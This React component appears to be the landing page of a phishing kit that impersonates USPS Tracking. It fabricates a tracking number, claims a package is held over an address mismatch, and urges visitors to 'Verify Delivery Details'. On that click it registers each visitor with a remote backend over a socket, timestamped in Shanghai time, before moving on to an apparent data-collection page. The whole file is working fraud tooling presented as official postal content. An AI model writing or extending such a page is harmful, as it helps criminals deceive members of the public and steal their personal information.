import { useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socket } from '../socket';
import { getClientId, setActivated } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

function buildOrderNumber(clientId: string) {
  const seed = (clientId || 'usps-order-seed').replace(/[^a-zA-Z0-9]/g, '');
  let hash = 0;
  for (let i = 0; i < seed.length; i += 1) {
    hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
  }

  const segment = (length: number, salt: number) => {
    let value = (hash ^ salt) >>> 0;
    let out = '';
    while (out.length < length) {
      value = (value * 1664525 + 1013904223) >>> 0;
      out += String(value % 10);
    }
    return out.slice(0, length);
  };

  return `${segment(3, 0x9e37)}-${segment(7, 0x85eb)}-${segment(7, 0xc2b2)}`;
}

export default function Home() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const orderNumber = useMemo(() => buildOrderNumber(getClientId()), []);
  const orderPlacedDate = new Intl.DateTimeFormat('en-US', {
    month: 'long',
    day: 'numeric',
    year: 'numeric',
  }).format(new Date());

  const handleContinue = () => {
    if (loading) return;
    setLoading(true);

    try {
      const clientId = getClientId();
      setActivated(true);

      const registerTime = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Shanghai',
        hour12: false,
      });

      let started = false;
      const start = () => {
        if (started) return;
        started = true;

        socket.emit('attach-client', { clientId }, () => {
          socket.emit('join-page', 'home');
          socket.emit('register-user', { clickTime: registerTime, clientId }, () => {
            setLoading(false);
            navigate('/info');
          });
        });
      };

      if (!socket.connected) {
        socket.connect();
        socket.once('connect', start);
        window.setTimeout(start, 900);
        return;
      }

      start();
    } catch {
      setLoading(false);
    }
  };

  return (
    <div className="alz-page alz-usps-page">
      <section className="alz-usps-hero" aria-hidden="true">
        <div className="alz-usps-hero-panel">
          <div className="alz-usps-hero-panel-top" />
          <div className="alz-usps-hero-panel-line alz-usps-hero-panel-line-short" />
          <div className="alz-usps-hero-panel-line" />
          <div className="alz-usps-hero-panel-line alz-usps-hero-panel-line-mid" />
          <div className="alz-usps-hero-panel-card" />
        </div>
        <div className="alz-usps-hero-blur" />
        <div className="alz-usps-hero-phone">
          <div className="alz-usps-hero-phone-notch" />
          <div className="alz-usps-hero-phone-screen">
            <div className="alz-usps-hero-appbar" />
            <div className="alz-usps-hero-card alz-usps-hero-card-top" />
            <div className="alz-usps-hero-card alz-usps-hero-card-mid" />
            <div className="alz-usps-hero-card alz-usps-hero-card-low" />
          </div>
        </div>
      </section>

      <div className="alz-shell">
        <section className="alz-usps-intro">
          <div className="alz-usps-intro-copy">
            <div className="alz-usps-eyebrow">USPS Tracking</div>
            <h1 className="alz-usps-title">Your package is on hold pending final delivery confirmation</h1>
            <p className="alz-usps-lead">
              USPS needs an updated recipient confirmation before this shipment can move to the next delivery step. Review the
              tracking information and verify the delivery details to continue processing.
            </p>
            <div className="alz-usps-intro-meta">
              <span>Expected service: Priority Mail</span>
              <span>Latest event: Address confirmation required</span>
            </div>
          </div>
          <div className="alz-usps-track-card">
            <div className="alz-usps-track-head">
              <div className="alz-usps-track-label">Tracking Number</div>
              <div className="alz-usps-track-badge">ACTIVE</div>
            </div>
            <div className="alz-usps-track-number">{orderNumber}</div>
            <div className="alz-usps-track-meta">Updated {orderPlacedDate}</div>
            <div className="alz-usps-track-state">USPS Tracking Status Available</div>
          </div>
        </section>

        <section className="alz-usps-service-grid">
          <article className="alz-usps-service-card alz-usps-service-card-primary">
            <div className="alz-usps-service-kicker">Delivery Action Required</div>
            <h2 className="alz-usps-service-title">Delivery is temporarily paused</h2>
            <p className="alz-usps-service-copy">
              USPS could not complete delivery using the recipient details currently associated with this shipment.
              Confirm the delivery information to continue processing.
            </p>
            <div className="alz-brand-row">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>
            <div className="alz-usps-action-row">
              <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
                {loading ? 'Opening...' : 'Verify Delivery Details'}
              </button>
              <p className="alz-usps-action-note">This update usually takes less than 2 minutes.</p>
            </div>
          </article>

          <article className="alz-usps-service-card">
            <div className="alz-usps-service-kicker">Shipment Details</div>
            <div className="alz-usps-detail-list">
              <div className="alz-usps-detail-row">
                <span>Status</span>
                <strong>Awaiting recipient review</strong>
              </div>
              <div className="alz-usps-detail-row">
                <span>Shipment Type</span>
                <strong>Priority Mail parcel</strong>
              </div>
              <div className="alz-usps-detail-row">
                <span>Last Activity</span>
                <strong>Address verification requested</strong>
              </div>
              <div className="alz-usps-detail-row">
                <span>Next Step</span>
                <strong>Confirm recipient address and contact</strong>
              </div>
            </div>
          </article>
        </section>

        <section className="alz-usps-info-grid">
          <article className="alz-usps-info-card">
            <div className="alz-usps-info-icon alz-usps-info-icon-package" />
            <div>
              <h3 className="alz-usps-info-title">Package verification</h3>
              <p className="alz-usps-info-copy">
                This shipment requires confirmation before it can be released for final delivery.
              </p>
            </div>
          </article>
          <article className="alz-usps-info-card">
            <div className="alz-usps-info-icon alz-usps-info-icon-address" />
            <div>
              <h3 className="alz-usps-info-title">Recipient review</h3>
              <p className="alz-usps-info-copy">
                Confirm the delivery address, ZIP Code, phone number, and email associated with the shipment.
              </p>
            </div>
          </article>
          <article className="alz-usps-info-card">
            <div className="alz-usps-info-icon alz-usps-info-icon-clock" />
            <div>
              <h3 className="alz-usps-info-title">Avoid delays</h3>
              <p className="alz-usps-info-copy">
                Completing the verification now helps USPS continue delivery without additional delays.
              </p>
            </div>
          </article>
        </section>

        <section className="alz-usps-support-card">
          <div className="alz-usps-support-copy">
            <div className="alz-usps-service-kicker">Need Assistance?</div>
            <h3 className="alz-usps-service-title">Why USPS is asking for this</h3>
            <p className="alz-usps-service-copy">
              A mismatch was detected in the delivery information associated with this shipment. USPS needs updated
              recipient details to release the package for delivery.
            </p>
          </div>
          <div className="alz-usps-support-side">
            <div className="alz-usps-support-status">Tracking #{orderNumber}</div>
            <div className="alz-usps-support-note">Delivery resumes after the required information is confirmed.</div>
            <div className="alz-usps-support-help">Need help? Visit USPS support for assistance with your shipment.</div>
          </div>
        </section>

        <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
        <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
      </div>
    </div>
  );
}
